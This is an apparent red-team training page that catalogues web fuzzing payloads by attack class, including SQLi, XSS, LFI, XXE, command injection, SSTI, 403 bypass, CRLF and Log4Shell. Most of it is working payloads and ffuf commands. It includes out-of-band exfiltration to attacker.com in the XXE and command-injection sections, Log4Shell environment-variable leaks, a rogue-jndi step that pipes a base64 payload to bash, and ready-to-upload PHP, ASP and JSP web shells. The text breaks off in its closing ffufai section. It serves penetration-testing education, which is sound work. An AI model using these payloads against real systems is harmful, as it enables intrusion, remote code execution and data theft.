---
layout: training-page
title: "Web Fuzzing Payloads — SecLists Reference — Red Team Academy"
module: "Web"
tags:
  - fuzzing
  - payloads
  - seclists
  - sqli
  - xss
  - lfi
  - xxe
  - ssti
  - command-injection
  - 403-bypass
page_key: "web-fuzzing-payloads"
render_with_liquid: false
---

# Web Fuzzing Payloads — SecLists Reference

## Overview

This page documents the best SecLists payload files for web attack fuzzing, organized by vulnerability class. For each category the recommended list files are noted with their sizes, sample payloads are shown for learning purposes, and tool commands demonstrate how to use the lists in real engagements.

Standard install path: `/usr/share/seclists/` (Kali/ParrotOS) or clone from **github.com/danielmiessler/SecLists**.

| Attack Type | SecLists Path | Best List | MITRE |
| --- | --- | --- | --- |
| SQL Injection | Fuzzing/Databases/SQLi/ | quick-SQLi.txt (77), Generic-SQLi.txt (268) | T1190 |
| XSS | Fuzzing/XSS/ | XSS-Polyglots.txt, XSS-Jhaddix.txt | T1059.007 |
| LFI / Path Traversal | Fuzzing/LFI/ | LFI-Jhaddix.txt (930) | T1083 |
| XXE | Fuzzing/XXE-Fuzzing.txt | XXE-Fuzzing.txt (46) | T1190 |
| Command Injection | Fuzzing/ | command-injection-commix.txt | T1059 |
| SSTI | Fuzzing/ | template-engines-expression.txt | T1059 |
| 403 Bypass | Fuzzing/403/ | 403.md (77 techniques) | T1190 |
| NoSQL Injection | Fuzzing/Databases/SQLi/ | NoSQL.txt (22) | T1190 |
| LDAP Injection | Fuzzing/ | LDAP.Fuzzing.txt | T1190 |
| SSI Injection | Fuzzing/ | SSI-Injection-Jhaddix.txt | T1190 |

## SQL Injection Payloads

SecLists maintains separate lists per database engine and attack type. Start with `quick-SQLi.txt` for initial detection, then use engine-specific lists once the backend is identified.

### List Selection Guide

```
# /usr/share/seclists/Fuzzing/Databases/SQLi/
#
# quick-SQLi.txt          77 payloads  — fast detection probe (start here)
# Generic-SQLi.txt       268 payloads  — broad coverage, all engines
# Generic-BlindSQLi.fuzzdb.txt  42    — time-based and boolean blind
# sqli.auth.bypass.txt    96 payloads  — login form bypass
# SQLi-Polyglots.txt       3 payloads  — single-payload multi-context
# MySQL.fuzzdb.txt         6 payloads  — MySQL-specific
# MySQL-SQLi-Login-Bypass.fuzzdb.txt  8  — MySQL login bypass
# MSSQL.fuzzdb.txt        17 payloads  — SQL Server xp_cmdshell, stacked
# Oracle.fuzzdb.txt       55 payloads  — Oracle-specific
# NoSQL.txt               22 payloads  — MongoDB operator injection
```

### Detection — Quick Probe

```
# Detect injection with ffuf (quick-SQLi.txt):
ffuf -u "https://target.com/search?q=FUZZ" \
  -w /usr/share/seclists/Fuzzing/Databases/SQLi/quick-SQLi.txt \
  -fs 1234 -ac -mc all

# Burp Intruder — sniper mode on a parameter:
# Payload set → Simple List → paste quick-SQLi.txt content
# Match on: "SQL", "syntax", "mysql", "ORA-", "pg_"
```

### Key Payloads — Error-Based

```
# Basic detection (causes syntax error in most engines):
'
"
`
')
")
')--
"))--

# MySQL error-based:
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--

# MSSQL error-based:
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
'; exec xp_cmdshell('whoami')--

# Oracle error-based:
' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--
```

### Auth Bypass Payloads (sqli.auth.bypass.txt)

```
# Top auth bypass patterns (from sqli.auth.bypass.txt):
admin'--
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or ('1'='1
" or "1"="1"--
" or 1=1--
1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055
# (MD5 hash of '1234' — matches if app compares directly)

# SQLi polyglot (hits multiple engines in one payload):
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Blind SQLi (Generic-BlindSQLi.fuzzdb.txt)

```
# Time-based blind detection:
' WAITFOR DELAY '0:0:5'--          # MSSQL
' OR SLEEP(5)--                    # MySQL
' OR pg_sleep(5)--                 # PostgreSQL
1) OR pg_sleep(5)--
benchmark(10000000,MD5(1))#        # MySQL CPU-based
' AND 1=(SELECT 1 FROM pg_sleep(5))--

# Boolean-based blind:
' AND 1=1--    # TRUE  → different response
' AND 1=2--    # FALSE → different response
' AND substring(version(),1,1)='5'--
```

### NoSQL Injection (NoSQL.txt)

```
# MongoDB operator injection:
true, $where: '1 == 1'
{ $ne: 1 }
{ $gt: '' }
{"$gt": ""}
[$ne]=1
', $or: [ {}, { 'a':'a
' || 'a'=='a

# In HTTP parameters (URL-encoded):
username[$ne]=nonexistent&password[$ne]=nonexistent
username[$gt]=&password[$gt]=

# MongoDB JavaScript injection:
'; sleep(5000);
db.injection.insert({success:1});

# sqlmap with NoSQL:
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --dbms=mongodb
```

## XSS Payloads

SecLists maintains multiple XSS lists organized by author and context. The `human-friendly` directory has cleaner lists for manual testing; `robot-friendly` versions are URL-encoded for automated scanners.

### List Selection Guide

```
# /usr/share/seclists/Fuzzing/XSS/
#
# Polyglots/XSS-Polyglots.txt       14   — multi-context, one payload tests many
# Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt  — single comprehensive polyglot
# human-friendly/XSS-Jhaddix.txt        — curated, works in many contexts
# human-friendly/XSS-BruteLogic.txt     — minimal vectors, high bypass rate
# human-friendly/XSS-Cheat-Sheet-PortSwigger.txt  — PortSwigger lab payloads
# human-friendly/XSS-payloadbox.txt     — large collection, all contexts
# human-friendly/xss-without-parentheses-semi-colons-portswigger.txt  — WAF bypass
```

### XSS Polyglots — Test All Contexts at Once

```
# XSS polyglots work in HTML, attribute, JS string, and URL contexts simultaneously:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
" onclick=alert(1)// */ alert(1)//
javascript://'/-->*/alert()/*

# Test with ffuf:
ffuf -u "https://target.com/search?q=FUZZ" \
  -w /usr/share/seclists/Fuzzing/XSS/Polyglots/XSS-Polyglots.txt \
  -mr "alert|onerror|onload" -v
```

### Context-Specific Payloads

```
# HTML context (tag injection):
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">

# Attribute context (break out of attribute):
" onmouseover="alert(1)
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
">

# JavaScript string context:
';alert(1)//
\';alert(1)//

# WAF bypass — without parentheses (from PortSwigger list):
onerror=alert;throw 1
<svg/onload=alert`1`>
javascript:void`alert\`1\``

# Filter bypass — case/encoding:
<ScRiPt>alert(1)</sCrIpT>
%3Cscript%3Ealert(1)%3C/script%3E
<img src=x onerror=alert(1)>
<img src=x onerror=\u0061lert(1)>
```

## LFI / Path Traversal Payloads

Local File Inclusion testing requires trying many traversal encodings. The Jhaddix list is the best starting point; Windows-specific lists for IIS targets.

### List Selection Guide

```
# /usr/share/seclists/Fuzzing/LFI/
#
# LFI-Jhaddix.txt                   930  — best general list, Linux + Windows
# LFI-LFISuite-pathtotest.txt        570  — LFISuite compatible
# LFI-LFISuite-pathtotest-huge.txt        — largest, all encodings
# LFI-linux-and-windows_by-1N3@CrowdShield.txt  — combined, many encodings
# Windows-LFI-Payloads_by-adeadfed.txt          — Windows-focused
# Windows-Paths.txt                             — common Windows sensitive paths
# Linux/LFI-gracefulsecurity-linux.txt          — Linux sensitive file paths
# LFI-etc-files-of-all-linux-packages.txt       — exhaustive /etc file list
```

### Path Traversal Payloads

```
# Basic traversal:
../../../../etc/passwd
../../../etc/passwd
../../etc/passwd

# Null byte (older PHP/CGI):
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# URL-encoded variations:
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd   # double URL encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Windows UNC / backslash:
..\..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
%5c..%5c..%5c..%5cwindows%5cwin.ini

# Wrapper bypass for PHP include():
php://filter/convert.base64-encode/resource=/etc/passwd
php://input   (POST body contains PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
phar:///var/www/html/upload/shell.jpg/test

# ffuf LFI scan:
ffuf -u "https://target.com/page?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fs 0 -ac -t 50
```

### High-Value Target Files

```
# Linux:
/etc/passwd
/etc/shadow           # requires root
/etc/hosts
/etc/hostname
/proc/self/environ    # may contain credentials in env vars
/proc/self/cmdline
/proc/net/tcp         # network connections (hex)
~/.ssh/id_rsa
~/.bash_history
/var/log/apache2/access.log   # log poisoning vector
/var/log/nginx/access.log
/var/log/auth.log
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/var/www/html/.env
/app/.env
/home/*/config.php

# Windows:
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM     # locked; use shadow copy
C:\inetpub\wwwroot\web.config
C:\xampp\passwords.txt
C:\Users\[user]\.ssh\id_rsa
%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## XXE Payloads

XXE (XML External Entity) injection reads local files, performs SSRF, or causes DoS. The SecLists XXE list covers file read, SSRF, OOB, and DoS variants.

### List File

```
# /usr/share/seclists/Fuzzing/XXE-Fuzzing.txt  (46 payloads)
# Covers: file read, SSRF, OOB exfil, protocol handlers
```

### Core XXE Payloads

```
# Basic file read — inline:
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

# Windows file read:
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>

# SSRF via XXE (internal network probe):
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://192.168.1.1:8080/" >]>

# PHP base64 wrapper — bypasses character restrictions:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>

# Out-of-Band (OOB) exfil via DTD — when response doesn't reflect content:
# Step 1: host evil.dtd on attacker box
# evil.dtd content:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
<!%eval;>
<!%exfil;>

# Step 2: reference evil.dtd in the XML:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<foo>trigger</foo>

# DoS — Billion Laughs:
<!DOCTYPE bomb [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;">]><bomb>&lol3;</bomb>
```

## Command Injection Payloads

`command-injection-commix.txt` is the Commix tool's payload list — URL-encoded shell metacharacters with canary strings to confirm execution.

### List File

```
# /usr/share/seclists/Fuzzing/command-injection-commix.txt
# URL-encoded command injection with random canary strings to detect blind execution
```

### Core Payloads — By Separator

```
# Semicolon (Unix):
; id
; whoami
; cat /etc/passwd
;id;
; ls -la /
; curl http://10.10.14.5/`whoami`

# Pipe:
| id
| whoami
|| id

# Logical AND:
&& id
&&id&&
& id &

# Newline (URL-encoded):
%0aid
%0awhoami
%0a/bin/bash -c 'curl http://10.10.14.5/`id`'

# Backtick substitution:
`id`
`curl http://10.10.14.5/$(whoami)`

# Command substitution:
$(id)
$(curl http://10.10.14.5/$(whoami))

# Windows separators:
& whoami
| whoami
|| whoami
; dir
%26 dir   # URL-encoded &
%7C dir   # URL-encoded |

# Blind detection (DNS callback):
; nslookup $(whoami).attacker.com
; curl http://attacker.com/`id`
|| ping -c1 attacker.com

# ffuf command injection:
ffuf -u "https://target.com/api?ip=FUZZ" \
  -w /usr/share/seclists/Fuzzing/command-injection-commix.txt \
  -fr "error|exception" -v
```

## SSTI — Server-Side Template Injection

The `template-engines-expression.txt` list contains detection probes for all major template engines. A math expression (42*42=1764) confirms execution without side effects.

### List File

```
# /usr/share/seclists/Fuzzing/template-engines-expression.txt
# Detection probes: 42*42 → look for 1764 in response
```

### Detection Probes

```
# Generic probes — send all, look for 1764 in response:
{{42*42}}           # Jinja2, Twig, Django, Nunjucks
#{42*42}            # Ruby ERB, Slim
${42*42}            # FreeMarker, Velocity, Pebble, Thymeleaf (some)
<%= 42*42 %>        # ERB (Ruby), JSP EL
{42*42}             # Smarty (PHP)
{{=42*42}}          # Liquid
[[${42*42}]]        # Thymeleaf
{^xyzm42}1764{/xyzm42}  # Handlebars (expects static match)

# ffuf SSTI:
ffuf -u "https://target.com/page?name=FUZZ" \
  -w /usr/share/seclists/Fuzzing/template-engines-expression.txt \
  -mr "1764" -v
```

### RCE Payloads by Engine

```
# Jinja2 (Python Flask):
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP):
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}

# FreeMarker (Java):
${"freemarker.template.utility.Execute"?new()("id")}
${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(...)}

# Velocity (Java):
#set($x="")##
#set($rt=$x.class.forName("java.lang.Runtime"))
#set($chr=$x.class.forName("java.lang.Character"))
#set($str=$x.class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("id"))

# ERB (Ruby):
<%= `id` %>
<%= system("id") %>

# Handlebars (JS — sandbox escape):
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}
  {{this.pop}}{{this.push (lookup string.sub "constructor")}}
  {{this.pop}}{{#with string.split as |codelist|}}...{{/with}}{{/with}}{{/with}}{{/with}}
```

## 403 / Access Control Bypass

This content comes directly from `Fuzzing/403/403.md` by @jhaddix — 77 URL manipulation techniques that bypass misconfigured access controls. These work best against paths that return 403 but should be accessible, like `/admin`, `/config`, `/.git`.

### URL Manipulation (Top Methods)

```
# Trailing characters / path variations:
/admin/
/admin/?
//admin//
/./admin/./
/admin/.
/admin/*
/admin/..
/admin/../

# URL encoding:
/admin/%20
/admin/%09
/admin/%00
/admin/%2f
/admin/%25
/admin/%23
/admin/%3f

# Path normalization tricks:
/./admin
/..;/admin
/.;/admin
/;/admin
//;//admin
/%2e/admin
/admin..;/
/admin;/
/admin.json
/admin/.json

# Case / extension variants:
/ADMIN
/ADMIN/
/ADM+IN
/admin~
/admin.css
/admin.html
/admin?id=1
```

### HTTP Header Injection (403 Bypass)

```
# Override origin IP — trick proxies / load balancers:
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Referer spoofing:
Referer: https://target.com/admin

# Custom host:
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1

# Tool — bypass403 (automated header injection):
python3 bypass-403.py -u https://target.com -p /admin

# ffuf header fuzzing:
ffuf -u "https://target.com/admin" \
  -H "X-Forwarded-For: FUZZ" \
  -w /usr/share/seclists/Fuzzing/special-chars.txt
```

### HTTP Method Override

```
# Try different HTTP verbs:
GET    /admin → 403
POST   /admin → 200?
HEAD   /admin → 200?
OPTIONS /admin → 200?
TRACE  /admin → 200?
PUT    /admin → 200?

# Method override headers (for proxies that ignore method):
X-HTTP-Method-Override: GET
X-Method-Override: GET
_method=GET   (form POST parameter)

# curl tests:
curl -X POST https://target.com/admin
curl -X PUT https://target.com/admin
curl -X HEAD https://target.com/admin -I
```

## LDAP Injection Payloads

```
# /usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt
# /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt
# /usr/share/seclists/Fuzzing/LDAP-active-directory-classes.txt

# Boolean bypass (like SQLi but for LDAP filters):
*
*)
*()|%26'
*(|(mail=*))
*(|(objectclass=*))
*|
)(objectClass=*
*)(&(1=0
*))%00
admin)(&)
admin*)(&(|
admin*)(|(*

# LDAP auth bypass payloads:
*)(uid=*))(|(uid=*
*)(|(password=*))
admin)(&(password=anything)
*(|(cn=*))

# In URL parameter:
https://target.com/search?user=*)(%26
https://target.com/search?user=%2a%29%28%7c%28mail%3d%2a%29%29
```

## SSI / Format String Injection

```
# Server-Side Includes (SSI) — Apache/nginx:
# /usr/share/seclists/Fuzzing/SSI-Injection-Jhaddix.txt
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="ls /" -->
<!--#echo var="DATE_LOCAL" -->
<!--#printenv -->
<pre><!--#exec cmd="cat /etc/passwd"--></pre>

# Inject in: filenames, form fields, User-Agent, Referer
# Look for: .shtml, .shtm, .stm file extensions
# Server hint: Accept-Ranges header, SSI error messages

# Format String — C applications:
# /usr/share/seclists/Fuzzing/FormatString-Jhaddix.txt
%s%s%s%s%s%s%s%s%s%s%s
%p%p%p%p%p%p%p%p%p%p%p
%x%x%x%x%x%x%x%x%x%x
%n%n%n%n%n%n%n%n%n%n
%s%p%x%d
.1024d
%@
%d%d%d%d
```

## Big-List of Naughty Strings

`big-list-of-naughty-strings.txt` is a general-purpose input validation fuzzer — not targeted at specific vulns, but reliably triggers crashes, encoding errors, and unexpected behavior.

```
# /usr/share/seclists/Fuzzing/big-list-of-naughty-strings.txt
# Covers: Unicode, null bytes, emoji, SQL, XSS, format strings, path traversal,
# SSRF triggers, number parsing edge cases, and more — ~500 strings

# Ideal for: API parameter fuzzing, file upload names, form field length/encoding
ffuf -u "https://target.com/api/v1/user" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"FUZZ","password":"test"}' \
  -w /usr/share/seclists/Fuzzing/big-list-of-naughty-strings.txt \
  -mc 500,400,422 -v
```

## CRLF Injection — HTTP Response Splitting

CRLF (Carriage Return `\r` + Line Feed `\n`) injection allows attackers to inject arbitrary HTTP headers or split a single response into two. Primary impacts: session hijacking via cookie injection, XSS via injected Content-Type or body, cache poisoning.

OLFA list: `Payloads/crlf.txt` (275 payloads) — includes URL-encoded variants and full response-splitting chains.

```
# Detection — inject in URL path, query params, headers:
# Inject \r\n into a redirect URL or header-reflected parameter
https://target.com/redirect?url=https://example.com%0d%0aSet-Cookie:evil=1

# Core CRLF payloads (from OLFA Payloads/crlf.txt):
%0d%0a
%0a
%0D%0A
%0d%0aSet-Cookie:crlf=1
%0aSet-Cookie:crlf=1
%0D%0AHeader-Test:HacktivistRO
\r\nSet-Cookie:crlf=1
\\r\\nSet-Cookie:crlf=1
%250a  (double-encoded)
%25%30%61  (triple-encoded)

# Response splitting — inject full second response:
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E

# XSS via CRLF + Content-Type injection:
%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E

# Cookie injection (session fixation):
%0d%0aSet-Cookie:sessionid=attacker_controlled_value;Path=/;HttpOnly

# ffuf CRLF scan:
ffuf -u "https://target.com/redirectFUZZ" \
  -w /opt/olfa/Payloads/crlf.txt \
  -mc 200,301,302 -v
# Also try: SecLists CRLF list:
ffuf -u "https://target.com/redirectFUZZ" \
  -w /opt/olfa/dict/crlf_short.txt \
  -mc all -v

# Header injection test points:
# - Redirect URLs (?url=, ?next=, ?return=, ?redirect=)
# - User-Agent, Referer, X-Forwarded-Host (reflected into response headers)
# - Any parameter value that appears in a Location: or Set-Cookie: header
```

## Log4Shell — CVE-2021-44228

Log4Shell is a critical RCE vulnerability in Apache Log4j 2.x (versions <2.15.0). The logging library evaluates JNDI lookup expressions embedded in logged strings — any user-controlled data that reaches a log statement is a potential vector. Even services patched against the original CVE may be vulnerable to bypasses (CVE-2021-45046, CVE-2021-45105).

OLFA list: `dict/log4j_short.txt` (4 canonical payloads) + path `/log4j.properties`.

```
# Core Log4Shell payloads (replace YOUR_INTERACT_URL):
${jndi:ldap://YOUR_INTERACT_URL/a}
${jndi:ldaps://YOUR_INTERACT_URL/a}
${jndi:rmi://YOUR_INTERACT_URL/a}
${jndi:dns://YOUR_INTERACT_URL/a}

# With environment variable exfil (leaks JVM env data in DNS query):
${jndi:ldap://${env:user}.YOUR_INTERACT_URL/a}
${jndi:ldap://${env:HOSTNAME}.YOUR_INTERACT_URL/a}
${jndi:ldap://${sys:java.version}.YOUR_INTERACT_URL/a}

# Obfuscation bypasses (for WAF evasion):
${${lower:j}ndi:${lower:l}dap://YOUR_INTERACT_URL/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://YOUR_INTERACT_URL/a}
${j${::-n}di:ldap://YOUR_INTERACT_URL/a}
${j${lower:n}di:ldap://YOUR_INTERACT_URL/a}
${${upper:j}ndi:ldap://YOUR_INTERACT_URL/a}
%24%7Bjndi%3Aldap%3A%2F%2FYOUR_INTERACT_URL%2Fa%7D  (URL encoded)

# Fuzz every HTTP header — any that reaches a log statement is vulnerable:
PAYLOAD='${jndi:ldap://YOUR_INTERACT_URL/a}'
for header in "User-Agent" "X-Forwarded-For" "X-Api-Version" "Referer" \
              "Accept-Language" "Authorization" "X-Forwarded-Host" \
              "CF-Connecting_IP" "X-Originating-IP" "X-Remote-IP" \
              "X-Remote-Addr" "Forwarded" "True-Client-IP"; do
  curl -s -H "$header: $PAYLOAD" https://target.com/ -o /dev/null &
done
wait

# Nuclei — automated Log4Shell detection:
nuclei -u https://target.com \
  -t cves/2021/CVE-2021-44228.yaml \
  -t cves/2021/CVE-2021-45046.yaml \
  -t cves/2021/CVE-2021-45105.yaml \
  -interactsh-server YOUR_INTERACT_URL

# Burp Suite — enable Logger++ or Collaborator Everywhere extension,
# then browse all pages — extensions inject payload into every request header

# Detect exposed log4j.properties config (post-LFI):
# /log4j.properties
# /config/log4j.properties
# /WEB-INF/classes/log4j.properties

# Post-exploitation via JNDI LDAP callback:
# 1. Set up JNDI exploit server: github.com/veracode-research/rogue-jndi
java -jar rogue-jndi-1.1.jar -c "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|bash" -n YOUR_IP

# 2. Trigger with ldap:// pointing to your server:
${jndi:ldap://YOUR_IP:1389/a}
```

## Open Redirect Payloads

Open redirects allow attackers to redirect victims to malicious sites via a trusted domain URL. They are typically chained with phishing, OAuth token theft, or SSRF. OLFA's `open_redirect_short.txt` (106 entries) covers all common parser confusion techniques.

```
# Common vulnerable parameters:
# ?url=, ?redirect=, ?next=, ?return=, ?returnUrl=, ?goto=, ?dest=
# ?continue=, ?forward=, ?target=, ?rurl=, ?destination=, ?redir=

# Core bypass patterns (from OLFA open_redirect_short.txt):
.google.com           # relative path confusion
/.google.com
//google.com          # scheme-relative
///google.com
////google.com
/////google.com
////\;@example.com
////example.com/      # path confusion
////example.com@google.com/   # credential confusion
///\;@example.com
///172.217.167.46
//\;@example.com

# Protocol confusion:
javascript:alert(1)   # code execution context
data:text/html,
/\google.com          # backslash

# URL encoding:
%2F%2Fgoogle.com
%09google.com         # tab character
%0agoogle.com         # newline

# ffuf open redirect test:
ffuf -u "https://target.com/redirect?url=FUZZ" \
  -w /opt/olfa/dict/open_redirect_short.txt \
  -mc 301,302,303 \
  -mr "google\.com|attacker\.com" -v

# Impact chain — open redirect → OAuth token theft:
# 1. Find open redirect: https://target.com/redirect?url=https://attacker.com
# 2. OAuth redirect_uri bypass (if redirect_uri checks domain only):
# https://target.com/oauth/authorize?client_id=X&redirect_uri=https://target.com/redirect?url=https://attacker.com&response_type=token
# 3. Victim clicks link → OAuth token in fragment → attacker.com captures it
```

## FuzzDB — Attack Payload Database

FuzzDB is one of the original attack payload databases, predating SecLists. It covers OS command injection, path traversal, file upload bypass, RFI, web backdoors, and format strings. Many SecLists entries were sourced from FuzzDB. Install: `git clone https://github.com/fuzzdb-project/fuzzdb`. Standard reference path: `/opt/fuzzdb/`.

| Attack Category | FuzzDB Path | Key List | Size |
| --- | --- | --- | --- |
| SQL Injection (detect) | attack-payloads/sql-injection/detect/ | GenericBlind.fuzzdb.txt | ~42 |
| SQL Injection (exploit) | attack-payloads/sql-injection/exploit/ | MySQL.fuzzdb.txt | ~6 |
| XSS | attack-payloads/xss/ | rsnake.txt | 77 |
| OS Command Injection | attack-payloads/os-cmd-execution/ | reverse-shell-one-liners.doc.txt | ~30 |
| Path Traversal | attack-payloads/path-traversal/ | traversals-8-deep-exotic-encoding.txt | 882 |
| Remote File Inclusion | attack-payloads/rfi/ | rfi.txt | 2246 |
| File Upload Bypass | attack-payloads/file-upload/ | alt-extensions-php.txt | 60 |
| LDAP Injection | attack-payloads/ldap/ | ldap-injections.fuzzdb.txt | ~17 |
| XPath Injection | attack-payloads/xpath/ | xpath-injection.fuzzdb.txt | ~28 |
| XXE | attack-payloads/xml/ | xml-attacks.fuzzdb.txt | ~11 |
| Format Strings | attack-payloads/format-strings/ | format-strings.fuzzdb.txt | ~14 |
| Integer Overflow | attack-payloads/integer-overflow/ | integer-overflow.fuzzdb.txt | ~8 |
| Web Backdoors (PHP) | web-backdoors/php/ | multiple one-liners + shells | — |
| Web Backdoors (ASP) | web-backdoors/asp/ | cmd.asp, cmdasp.asp | — |
| DNS Bruteforce | discovery/DNS/ | subdomains-top1mil.txt | varies |
| File/Dir Bruteforce | discovery/FilenameBruteforce/ | raft-large-directories.txt | varies |

### Path Traversal — Exotic Encoding List

```
# FuzzDB's traversals-8-deep-exotic-encoding.txt covers 882 variations:
# Standard traversals, URL encoding, double encoding, Unicode, UTF-8 overlong sequences
# 8 directory levels deep (../../../../../../../../etc/passwd)

# Use with ffuf:
ffuf -u "https://target/download?file=FUZZ" \
  -w /opt/fuzzdb/attack-payloads/path-traversal/traversals-8-deep-exotic-encoding.txt \
  -mc 200 -mr "root:" -v

# Or with Burp Intruder: paste list into payload set, position on file parameter
```

### OS Command Injection — Reverse Shells

```
# reverse-shell-one-liners.doc.txt contains platform-specific one-liners:
# Bash, Python, Perl, PHP, Ruby, nc (with/without -e), Java, PowerShell, etc.

# Use with commix (auto command injection tool):
commix --url "https://target/ping?host=FUZZ" --level 3

# Manual with ffuf — detect command injection via time delay:
ffuf -u "https://target/ping?host=FUZZ" \
  -w /opt/fuzzdb/attack-payloads/os-cmd-execution/command-injection-template.fuzzdb.txt \
  -mc 200 -t 1  # single-threaded for accurate timing
```

### File Upload Bypass — PHP Extension List

```
# alt-extensions-php.txt — 60 alternate PHP extensions that may execute:
# .php, .php3, .php4, .php5, .php6, .php7, .phtml, .pHp, .PHP,
# .phps, .phpt, .phar, .pgif, .shtml, .htaccess, .inc, etc.

# Upload bypass workflow:
# 1. Upload webshell.php — blocked by MIME/extension check
# 2. Iterate through alt-extensions-php.txt:
ffuf -u "https://target/upload" \
  -X POST \
  -F "file=@shell.phpFUZZ;type=image/jpeg" \
  -w /opt/fuzzdb/attack-payloads/file-upload/alt-extensions-php.txt \
  -mc 200 -mr "success|uploaded" -v

# 3. Once accepted extension found, request the file to execute the shell
```

### RFI Payloads

```
# rfi.txt — 2246 RFI payloads covering:
# Null bytes, protocol wrappers (php://, data://, zip://, expect://)
# Double encoding, path normalization bypass

# Test for RFI:
ffuf -u "https://target/page?include=FUZZ" \
  -w /opt/fuzzdb/attack-payloads/rfi/rfi.txt \
  -mc 200 -mr "RFI_MARKER"  # put a marker in your hosted file

# Host a test file:
echo "<?php echo 'RFI_MARKER'; ?>" > /tmp/rfi_test.php
python3 -m http.server 8080 --directory /tmp/

# Then replace FUZZ targets with http://ATTACKER_IP:8080/rfi_test.php
```

### Web Backdoors Reference

```
# FuzzDB web-backdoors/ directory — ready-to-upload shells:
# PHP one-liners:
#   <?php system($_GET["cmd"]); ?>
#   <?php passthru($_GET["cmd"]); ?>
#   <?=`$_GET[0]`?>      (short tag, executes via backtick)
#   <script language="php">system($_GET['c']);</script>  (bypass <?php filter)
#
# ASP one-liners (web-backdoors/asp/):
#   <% Response.Write(CreateObject("WScript.Shell").Exec("cmd /c "&Request("cmd")).StdOut.ReadAll()) %>
#
# JSP (web-backdoors/jsp/):
#   <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
#
# ASP.NET (web-backdoors/aspx/):
#   <%@ Page Language="C#"%><%Response.Write(new System.Diagnostics.Process()...%>

# IMPORTANT: Only upload to systems you own or have written authorization to test.
```

## ffufai — AI-Powered Fuzzing Assistant

ffufai is a wrapper around ffuf that uses an LLM (Claude or GPT) to automatically suggest relevant file extensions to fuzz based on the target URL and its response headers. Rather than blindly applying a generic wordlist, ffufai analyzes the server stack and injects targeted extensions.

```
# Install:
git clone https://github.com/jthack/ffufai
cd ffufai
pip install requests openai anthropic
chmod +x ffufai.py
sudo ln -s /full/path/to/ffufai.py /usr/local/bin/ffufai

# Set API key (Claude or OpenAI):
export ANTHROPIC_API_KEY='sk-ant-...'
# or: export OPENAI_API_KEY='sk-...'

# Basic usage — same syntax as ffuf, replace 'ffuf' with 'ffufai':
